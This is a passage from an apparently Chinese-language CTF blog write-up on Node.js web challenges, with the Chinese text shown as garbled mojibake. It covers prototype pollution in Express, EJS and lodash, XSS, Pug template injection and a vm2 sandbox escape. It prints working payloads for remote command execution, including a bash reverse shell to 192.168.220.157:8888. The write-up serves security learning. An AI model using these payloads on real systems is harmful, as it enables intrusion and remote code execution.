</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isObject</span>(<span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">attr</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isObject</span>(<span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">attr</span>])) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">attr</span>], <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">attr</span>]);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">attr</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">attr</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">a</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// cloneå’Œmergeæ•ˆæœä¸€æ ·
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">clone</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">a</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">merge</span>({}, <span style="color:#a6e22e">a</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">safeKeyword</span>(<span style="color:#a6e22e">keyword</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">keyword</span>.<span style="color:#a6e22e">match</span>(<span style="color:#960050;background-color:#1e0010">/(admin)/is)) {</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">keyword</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">undefined</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/login&#39;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">outputFunctionName</span><span style="color:#f92672">=</span><span style="color:#66d9ef">undefined</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>,<span style="color:#a6e22e">data</span><span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;user&#39;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">user</span>});
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;login&#39;</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">Submit</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#34;register&#34;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// è¿™é‡Œsafekeywordå°±æ˜¯ä¸è®©é€šè¿‡ADMINè¿›è¡Œæ³¨å†Œ
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">safeKeyword</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">userid</span>)){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;forbid word&#39;);history.go(-1);&lt;/script&gt;&#34;</span>) 
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span><span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// toUpperCase()é™¤äº†æ­£å¸¸çš„å¤§å°å†™è½¬åŒ–ä¹‹å¤–ä¼šå°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œä¸€ä¸ªè½¬åŒ–
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#e6db74">&#39;user&#39;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">userid</span>.<span style="color:#a6e22e">toUpperCase</span>(),
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;passwd&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">pwd</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;isLogin&#39;</span><span style="color:#f92672">:</span><span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>); 
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">Submit</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#34;login&#34;</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>){<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;register first&#39;);history.go(-1);&lt;/script&gt;&#34;</span>)}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">user</span><span style="color:#f92672">==</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">userid</span><span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">pwd</span><span style="color:#f92672">==</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">passwd</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">isLogin</span><span style="color:#f92672">=</span><span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;error passwd&#39;);history.go(-1);&lt;/script&gt;&#34;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>); ;
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/action&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">user</span><span style="color:#f92672">!=</span><span style="color:#e6db74">&#34;ADMIN&#34;</span>){<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&#34;</span>)}
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// è¿™é‡Œæœ‰è§¦å‘åŸå‹é“¾æ±¡æŸ“çš„æœºä¼š
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">clone</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;success&#39;);history.go(-1);&lt;/script&gt;&#34;</span>);  
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/info&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>,<span style="color:#a6e22e">data</span><span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;user&#39;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">outputFunctionName</span>});
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">router</span>;
</span></span></code></pre></div><p>è¦è§¦å‘åŸå‹é“¾æ±¡æŸ“æœ‰ä¸ªå‰ææ¡ä»¶:  ç™»å½•admin, çœ‹æºç çš„æ„æ€å°±æ˜¯é¦–å…ˆéœ€è¦æ³¨å†Œä¸€ä¸ªADMIN, ä½†æ˜¯<code>safekeyword</code>å‡½æ•°å°†è¿™ä¸ªæ“ä½œé™åˆ¶ä½äº†, ç„¶è€Œ<code>toUpperCase</code>æœ‰å­—ç¬¦è½¬åŒ–çš„ç‰¹ç‚¹, å‚è€ƒ</p>
<p><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
<p>å› æ­¤ä½¿ç”¨<code>admÄ±n </code>å’Œéšæ„çš„å¯†ç å»æ³¨å†Œä¸€ä¸ªç”¨æˆ·, å°±å¯ä»¥ç™»å½•adminäº†, ç™»å½•adminä¹‹åé€šè¿‡actionå‘é€å¦‚ä¸‹æ•°æ®åŒ…</p>
<pre tabindex="0"><code>{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;);//&#34;}}
</code></pre><p>å‘é€å®Œä¹‹åè®¿é—®ä¸€ä¸‹/infoå°±æ‹¿åˆ°äº†flag</p>
<p><img loading="lazy" src="/images/image-20200223184607314.png" alt="image-20200223184607314"  />
</p>
<p><a href="https://medium.com/bugbountywriteup/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501">https://medium.com/bugbountywriteup/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501</a></p>
<p>[https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md?tdsourcetag=s_pctim_aiomsg](<a href="https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split">https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split</a> second/split second.md?tdsourcetag=s_pctim_aiomsg)</p>
<h2 id="2019-xnuca-hardjs-å¤ç°">2019 XNUCA hardjs å¤ç°<a hidden class="anchor" aria-hidden="true" href="#2019-xnuca-hardjs-å¤ç°">#</a></h2>
<p>é¡µé¢åŠŸèƒ½: æ³¨å†Œ ç™»å½• å‘è¡¨è¯„è®º</p>
<p>æ‹¿åˆ°æºä»£ç ä¹‹åé¦–å…ˆä½¿ç”¨å‘½ä»¤<code>npm audit</code>æ¥è‡ªåŠ¨æ£€æµ‹ä¸€ä¸‹æ˜¯å¦æœ‰å­˜åœ¨æ¼æ´çš„ä¾èµ–åŒ…</p>
<p><img loading="lazy" src="/images/image-20200123220813194.png" alt="image-20200123220813194"  />
</p>
<p>ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“æ¼æ´, å¥½çš„. çœ‹ä¸‹<code>lodash</code>æ˜¯å¹²å•¥çš„</p>
<p><img loading="lazy" src="/images/image-20200123220954191.png" alt="image-20200123220954191"  />
</p>
<p>æŸ¥çœ‹æºä»£ç éƒ¨åˆ†çœ‹çœ‹åœ¨å“ªé‡Œç”¨åˆ°äº†è¿™ä¸ª<code>lodash</code></p>
<p><img loading="lazy" src="/images/image-20200123221147765.png" alt="image-20200123221147765"  />
</p>
<p>å¤§æ„æ˜¯è®¿é—®<code>/get</code>è·¯ç”±å°±ä¼šä»æ ¹æ®useridä»æ•°æ®åº“ä¸­æŸ¥è¯¢å‡ºæ¶ˆæ¯, åˆ¤æ–­æ¡æ•°, å¦‚æœå¤§äº5æ¡çš„è¯, å°±ä¼šå¯¹æ¯ä¸€æ¡éƒ½è¿›è¡Œä¸€ä¸ª<code>lodash.defaultsDeep</code>å‡½æ•°å¤„ç†, æŸ¥æŸ¥çœ‹payload</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">mergeFn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;lodash&#39;</span>).<span style="color:#a6e22e">defaultsDeep</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;constructor&#34;: {&#34;prototype&#34;: {&#34;a0&#34;: true}}}&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mergeFn</span>({}, <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">payload</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (({})[<span style="color:#e6db74">`a0`</span>] <span style="color:#f92672">===</span> <span style="color:#66d9ef">true</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Vulnerable to Prototype Pollution via </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">payload</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">check</span>();
</span></span></code></pre></div><p>é‚£ä¹ˆæ„é€ ä¸€ä¸ªç±»ä¼¼çš„åº”è¯¥å°±å¯ä»¥æ±¡æŸ“ä»»æ„å‚æ•°äº†.</p>
<p>ç„¶åæ€è·¯æ˜¯æƒ³é€šè¿‡xssè®©å¯¹é¢çš„botå°†ä½œä¸ºflagçš„passwordå‘é€å‡ºæ¥, ä½†æ˜¯å’Œä¼ ç»Ÿçš„å‘é€urlé“¾æ¥è®©å¯¹é¢botæŸ¥çœ‹çš„æ–¹å¼ä¸ä¸€æ ·, æˆ‘ä»¬æ²¡æœ‰è¿™ä¹ˆä¸ªç©æ„. é‚£ä¹ˆæƒ³è¦xssæ€ä¹ˆåŠ? åªèƒ½ä¼ªé€ ç™»å½•è¿›botçš„è´¦å·, å†åœ¨botçš„æ¶ˆæ¯åˆ—è¡¨ä¸­æ’å…¥xssä»£ç , ç­‰å¯¹é¢æŸ¥çœ‹çš„æ—¶å€™å°±å¯ä»¥è§¦å‘äº†, é‚£ä¹ˆæ€ä¹ˆä¼ªé€ ç™»å½•å‘¢?</p>
<p>æŸ¥çœ‹ä¸€ä¸‹ç™»å½•éªŒè¯çš„ä»£ç </p>
<p><img loading="lazy" src="/images/image-20200123224339539.png" alt="image-20200123224339539"  />
</p>
<p>å¥½, é‚£ä¹ˆå¯ä»¥è€ƒè™‘ä¸€ä¸‹æŠŠ<code>login</code>è¿˜æœ‰<code>userid</code>è¿™ä¿©éƒ½ç»™æ±¡æŸ“æˆtrue</p>
<p><img loading="lazy" src="/images/image-20200123224551590.png" alt="image-20200123224551590"  />
</p>
<p>å¤šå‘å‡ æ¬¡ç„¶åè·¯ç”±è®¿é—®<code>/get</code>å»è§¦å‘ä¸€ä¸‹, æŠŠcookieéƒ½åˆ æ‰é‡æ–°è®¿é—®åå°±ä¼šå‘ç°æˆåŠŸä»¥userid=1çš„èº«ä»½ç™»å½•äº†.</p>
<p>ç™»å½•å®Œä¹‹åå°±è¦è€ƒè™‘æ€ä¹ˆåœ¨é¡µé¢ä¸­æ’å…¥xssä»£ç äº†</p>
<p>åœ¨app.jsä¸­æœ‰è¿™ä¹ˆä¸€æ®µ</p>
<p><img loading="lazy" src="/images/image-20200123233543747.png" alt="image-20200123233543747"  />
</p>
<p>è¿™ä¸ª<code>$.extend</code>ç›¸å½“äºåˆå¹¶æ•°ç»„, è¿™ç§æ“ä½œä¹Ÿå¯ä»¥é€ æˆåŸå‹é“¾æ±¡æŸ“,<code>CVE-2019-11358</code> å†æ¥çœ‹é¡µé¢æ¸²æŸ“çš„éƒ¨åˆ†</p>
<p><img loading="lazy" src="/images/image-20200123235223013.png" alt="image-20200123235223013"  />
</p>
<p>ä¼šæŠŠç¬¦åˆæ¡ä»¶çš„hintsæ ‡ç­¾éƒ½æ‹¿å‡ºæ¥æ¸²æŸ“ä¸€é, åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå°†æ²™ç›’ä½œç”¨åœ¨è¿™äº›æ ‡ç­¾ä¸Š</p>
<p><img loading="lazy" src="/images/image-20200123235208032.png" alt="image-20200123235208032"  />
</p>
<p>ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆåœ¨å¦‚å›¾åœ°æ–¹ç›´æ¥å†™xssä»£ç ä¼šæ— æ•ˆçš„åŸå› </p>
<p><img loading="lazy" src="/images/image-20200123235558341.png" alt="image-20200123235558341"  />
</p>
<p>è§‚å¯Ÿæ¸²æŸ“æ¨¡æ¿<code>index.ejs</code>, å‘ç°æœ‰ä¸€ä¸ªæ ‡ç­¾<code>logger</code>ä¸åœ¨æ²™ç›’é™åˆ¶ä¸­å¹¶ä¸”ç¬¦åˆæ¡ä»¶, é‚£ä¹ˆ, å¯ä»¥æ±¡æŸ“hintsè®©ä»–çš„åŸå‹ä¸­åŒ…å«loggerä»è€Œè®©hintsåœ¨éå†çš„è¿‡ç¨‹ä¸­éå†åˆ°loggerç„¶åå»æ¸²æŸ“ä»–, loggeré‡Œçš„å†…å®¹è‡ªç„¶æ˜¯postè¡¨å•äº†.</p>
<p><img loading="lazy" src="/images/image-20200123233034091.png" alt="image-20200123233034091"  />
</p>
<p>è¿˜æœ‰ä¸€ç§è§£æ³•, ç­‰æˆ‘ä¼šè°ƒè¯•jsäº†å°±å»è¡¥</p>
<h3 id="jade-pug-æ¨¡æ¿æ³¨å…¥">jade pug æ¨¡æ¿æ³¨å…¥<a hidden class="anchor" aria-hidden="true" href="#jade-pug-æ¨¡æ¿æ³¨å…¥">#</a></h3>
<pre tabindex="0"><code>const pug=require(&#39;pug&#39;);

pug.render(&#39;#{console.log(&#34;1&#34;)}&#39;);
pug.render(&#39;-console.log(1)&#39;);
</code></pre><p>renderfileä¹Ÿå¯ä»¥æ¨¡æ¿æ³¨å…¥</p>
<pre tabindex="0"><code>
cmd = &#39;bash -i &gt;&amp; /dev/tcp/192.168.220.157/8888 0&gt;&amp;1&#39;

payload = &#34;process.binding(&#39;spawn_sync&#39;).spawn({file:&#39;bash&#39;,args:[&#39;/bin/bash&#39;,&#39;-c&#39;,&#39;%s&#39;],envPairs:[&#39;y=&#39;],stdio:[{type:&#39;pipe&#39;,readable:1}]})&#34; % cmd

pug = (&#39;&#39;&#39;-[][&#34;constructor&#34;][&#34;constructor&#34;](&#34;{}&#34;)()&#39;&#39;&#39;.format(payload)).replace(&#39;&#34;&#39;,&#39;%22&#39;).replace(&#34;&#39;&#34;,&#34;%27&#34;)
# pug = (&#39;&#39;&#39;#{[][&#34;constructor&#34;][&#34;constructor&#34;](&#34;%s&#34;)()}&#39;&#39;&#39;%(payload)).replace(&#39;&#34;&#39;,&#39;%22&#39;).replace(&#34;&#39;&#34;,&#34;%27&#34;)
print quote(pug)
</code></pre><p><a href="https://mp.weixin.qq.com/s/rIXIfhw3vcM9PVJI6HTq2g">https://mp.weixin.qq.com/s/rIXIfhw3vcM9PVJI6HTq2g</a></p>
<h2 id="è™ç¬¦æ¯-2020-justescape">è™ç¬¦æ¯ 2020 JustEscape<a hidden class="anchor" aria-hidden="true" href="#è™ç¬¦æ¯-2020-justescape">#</a></h2>
<p>ç”±è¿™ä¸ªé¢˜ç›®è€Œæ¥</p>
<p><a href="https://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS">https://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS</a></p>
<p>å¯ä»¥é€šè¿‡ä»¥ä¸‹å½¢å¼æ¥è¿›è¡Œè®¡ç®—</p>
<pre tabindex="0"><code>http://8959c4a3-f43e-45ff-a5e0-7753dd5556d6.node3.buuoj.cn/run.php?code=1-1
</code></pre><p>ä½†æ˜¯</p>
<pre tabindex="0"><code>http://8959c4a3-f43e-45ff-a5e0-7753dd5556d6.node3.buuoj.cn/run.php?code=1%2b1
</code></pre><p>ä¼šå¾—åˆ°</p>
<p><img loading="lazy" src="/images/image-20200420112457355.png" alt="image-20200420112457355"  />
</p>
<p>ä»åæ¥çš„è¡¨ç°æ¥çœ‹, æ˜¯è¢«è¿‡æ»¤äº†.</p>
<p><img loading="lazy" src="/images/image-20200420114138186.png" alt="image-20200420114138186"  />
</p>
<p>çœ‹é¢˜ç›®çš„æç¤º,å¯èƒ½åç«¯ä¸æ˜¯php, çœ‹åˆ°æ’ä»¶wappalyzeræ˜¾ç¤º</p>
<p><img loading="lazy" src="/images/image-20200420114321997.png" alt="image-20200420114321997"  />
</p>
<p>è€Œä¸”, <code>Date()</code>å‡½æ•° åœ¨javascriptä¸­å¯ä»¥ç”¨, ä¸å¸¦å‚æ•°. phpä¸­æ²¡æœ‰.æ‰€ä»¥å¯ä»¥åˆ¤æ–­åç«¯å…¶å®æ˜¯nodejså†™çš„.</p>
<p>ç”¨<code>Error().stack</code>æ¥è·å–å¯ä»¥ä½¿ç”¨çš„æ¨¡å—ä¿¡æ¯.</p>
<pre tabindex="0"><code>Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12)
</code></pre><p>ä½¿ç”¨payload, ä»https://github.com/patriksimek/vm2/issues/225 æ‰¾åˆ°çš„æœ€æ–°çš„.</p>
<pre tabindex="0"><code>?code[]=try{Buffer.from(new Proxy({}, {getOwnPropertyDescriptor(){throw f=&gt;f.constructor(&#34;return process&#34;)();}}));}catch(e){e(()=&gt;{}).mainModule.require(&#34;child_process&#34;).execSync(&#34;cat /flag&#34;).toString();}
</code></pre><p>åŸé¢˜çš„payloadåœ¨è¿™é‡Œæ‰“ä¸äº†</p>
<pre tabindex="0"><code>var process;
try{
Object.defineProperty(Buffer.from(&#34;&#34;),&#34;&#34;,{
value:new Proxy({},{
getPrototypeOf(target){
if(this.t)
throw Buffer.from;
this.t=true;
Object.getPrototypeOf(target);
}
})
});
}catch(e){
trueprocess = e.constructor(&#34;return process&#34;)();
}
process.mainModule.require(&#34;child_process&#34;).execSync(&#34;ls&#34;).toString()
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://ch3n9w.cpolar.cn/posts/ctf-qwb-copperstudy-record/">
    <span class="title">Â« Prev</span>
    <br>
    <span>copperstudy-record</span>
  </a>
  <a class="next" href="https://ch3n9w.cpolar.cn/posts/ctf-roarctfwp/">
    <span class="title">Next Â»</span>
    <br>
    <span>RoarCTF 2019å¤ç°</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="https://ch3n9w.cpolar.cn/">ch3n9w ã® è¶…å…ƒåŸŸ</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
